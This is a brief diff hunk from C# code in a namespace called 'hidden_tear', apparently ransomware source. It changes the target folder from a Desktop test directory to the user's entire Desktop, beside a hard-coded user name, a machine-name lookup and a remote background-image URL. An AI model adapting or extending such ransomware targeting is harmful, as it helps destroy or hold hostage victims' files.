@@ -55,7 +55,7 @@ namespace hidden_tear
         //string userName = Environment.UserName;
         string userName = "cowboxhero";
         string computerName = System.Environment.MachineName.ToString();
-        string userDir = "C:\\Users\\최고의 지식근로자\\Desktop\\test\\";
+        string userDir = "C:\\Users\\최고의 지식근로자\\Desktop\\";
         string backgroundImageUrl = "http://i.imgur.com/xZuLWTN.jpg"; //desktop background picture
 
 
